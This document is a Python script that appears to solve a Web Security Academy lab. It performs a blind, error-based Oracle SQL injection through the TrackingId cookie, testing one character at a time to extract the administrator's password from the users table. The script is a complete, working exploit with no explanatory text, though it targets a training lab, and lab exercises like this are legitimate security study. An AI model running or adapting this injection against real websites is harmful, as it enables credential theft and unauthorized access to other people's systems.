import requests
import string

URL = "https://0a56008703bf747380f0084f0010006d.web-security-academy.net/"

# Static cookies
BASE_TRACKING_ID = "auUu4gCFiacSAiG2"
SESSION = "ZuS2KtcKoYjMQoFGDxKK0ZcrN3YmAt1c"

# Character set to try
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits

def is_correct_char(position, ch):
    payload = (
        f"{BASE_TRACKING_ID}' AND ("
        f"SELECT CASE WHEN (SUBSTR(password,{position},1)='{ch}') "
        f"THEN TO_CHAR(1/0) ELSE NULL END "
        f"FROM users WHERE username='administrator'"
        f") IS NULL -- -"
    )

    cookies = {
        "TrackingId": payload,
        "session": SESSION
    }

    r = requests.get(URL, cookies=cookies, allow_redirects=False)

    # Oracle error triggers HTTP 500 in this lab
    return r.status_code == 500


def extract_password(max_len=30):
    password = ""

    for pos in range(1, max_len + 1):
        found = False
        for ch in CHARSET:
            if is_correct_char(pos, ch):
                password += ch
                print(f"[+] Found char {pos}: {ch} → {password}")
                found = True
                break

        if not found:
            print("[*] No more characters found, stopping.")
            break

    return password


if __name__ == "__main__":
    pwd = extract_password()
    print(f"\n[✓] Administrator password: {pwd}")
